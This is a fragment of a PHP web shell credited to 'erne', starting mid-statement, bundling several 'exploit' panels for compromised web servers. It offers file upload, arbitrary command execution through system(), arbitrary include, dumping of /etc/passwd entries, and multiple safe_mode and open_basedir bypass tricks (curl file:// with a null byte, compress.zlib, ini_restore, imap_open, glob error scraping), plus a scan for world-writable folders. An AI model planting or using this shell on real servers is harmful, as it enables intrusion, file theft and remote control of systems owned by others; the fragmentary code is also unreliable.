<html>
<head>
<title> Exploit: error_log() By * erne   * </title>
<body bgcolor=\"#000000\">
<table Width='100%' height='10%' bgcolor='#D0D0D0' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> By  erne </font></center></td>
</tr>
</table>
<font color='#9C9C9C'>
</head>
<?
if(\$fileup == \"\"){
ECHO \" reade for up \";
}else{
\$path= exec(\"pwd\");
\$path .= \"/\$fileup_name\";
\$CopyFile = copy(\$fileup,\"\$path\");
if(\$CopyFile){
echo \" up ok \";
}else{
echo \" no up \";
}
}
if(empty(\$_POST['m'])){
} else {
\$m=\$_POST['m'];
echo  system(\$m);
}
if(empty(\$_POST['cmd'])){
} else {
\$h=  \$_POST['cmd'];
 print include(\$h) ;
}
?>
<form method='POST' enctype='multipart/form-data' >
<input type='file' name='fileup' size='20'>
<input type='submit' value='  up  '>
</form>
<form method='POST'  >
<input type='cmd' name='cmd' size='20'>
<input type='submit' value='  open (shill.txt) '>
</form>
<form method='POST' enctype='multipart/form-data' >
<input type='text' name='m' size='20'>
<input type='submit' value='  run  '>
<input type='reset' value=' reset '>
</form>
", 3,$ERORR);
}

// id //
if ($_POST['plugin'] ){
echo "read file id" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";



                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";
                                break;


                                             }


// CURL //
if(empty($_POST['curl'])){

} else {
echo "read file CURL","<br>" ;
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea>";
}

// copy//
$u1p="";
$tymczas="";
if(empty($_POST['copy'])){
} else {
echo "read file copy" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$u1p=$_POST['copy'];
$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$u1p, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</textarea>";
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
}

/// ini_restore //
if(empty($_POST['M2'])){
} else {
echo "read file ini_restore","<br> ";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['M2'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$m");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$m");
echo "</textarea>";
}

// imap //

$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
echo "read file imap" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";

$stream = imap_open($string, "", "");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
echo "</textarea>";
} elseif ($string && $switch == "dir") {
echo "read  dir imap","<br>" ;
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";

$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");
$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]"."<p>&nbsp;</p>" ;
echo "</pre>";
imap_close($stream);
echo "</textarea>";
}
$tb->tdbody ("</td></tr></table>");
// open dir //
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: Open dir </b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');

if(empty($_POST['m'])){
echo "<div><FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
<table id=tb><tr><td><FONT COLOR=\"#9B9B9B\">path dir</FONT>
<INPUT type='text' name='m' size=70 value='./'>
<INPUT type='submit' value='show' id=input></td></tr></table></form></div>";

} else {
$m=$_POST['m'];
$spath = $m ;
$path = $m ;




        $method = intval(trim($_POST['method']));

        $handle = opendir($path);

        $_folders = array();

        $i = 0;

        while (false !== ($file = readdir($handle)))
        {
                $full_path = "$path/$file";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0777'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file;

                                $i++;
                        }
                }
        }


        closedir($handle);
        clearstatcache();



        echo '<strong><FONT COLOR=#9B9B9B>The folders is 777 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0755'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 755 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0644'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 644 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0750'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 750 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0604'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 604 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0705'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 705 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0606'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 606 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0703'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 703 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }



  }
    $handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);




                                $_folders[$i] = $file1;

                                $i++;


        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9B9B9B>www.ernealizm.us :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }

        echo '</FONT><strong><FONT COLOR=#9C9C9C>www.hack-medya.org: </strong>'.$i.'</FONT><br />';
$tb->tdbody ("</td></tr></table>");

$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: break fucking safe-mode </b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');


  error_reporting(E_WARNING);
  ini_set("display_errors", 1);

  echo "<head><title>".getcwd()."</title></head>";

  echo "<form method=POST>";
  echo "<div style='float: left'><FONT COLOR=\"#9B9B9B\">Root directory: </FONT><input type=text name=root value='{$_POST['root']}'></div>";
  echo "<input type=submit value='--&raquo;'></form>";



  // break fucking safe-mode !

  $root = "/";

  if($_POST['root']) $root = $_POST['root'];

  if (!ini_get('safe_mode')) die("<font size=-2 face=verdana color='#9B9B9B'>Safe-mode is OFF.</font>");
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
  $c = 0; $D = array();
  set_error_handler("eh");

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  for($i=0; $i < strlen($chars); $i++){
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";

  $prevD = $D[count($D)-1];
  glob($path."*");

        if($D[count($D)-1] != $prevD){

        for($j=0; $j < strlen($chars); $j++){

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";

           $prevD2 = $D[count($D)-1];
           glob($path."*");

              if($D[count($D)-1] != $prevD2){


                 for($p=0; $p < strlen($chars); $p++){

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";

                 $prevD3 = $D[count($D)-1];
                 glob($path."*");

                    if($D[count($D)-1] != $prevD3){


                       for($r=0; $r < strlen($chars); $r++){

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                       glob($path."*");

                       }

                    }

                 }

              }

        }

        }

  }

  $D = array_unique($D);


  foreach($D as $item) echo "{$item}\n";





  function eh($errno, $errstr, $errfile, $errline){

     global $D, $c, $i;
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
     if($o){ $D[$c] = $o[2]; $c++;}

  }
  echo "</textarea>";
$tb->tdbody ("</td></tr></table>");
?>
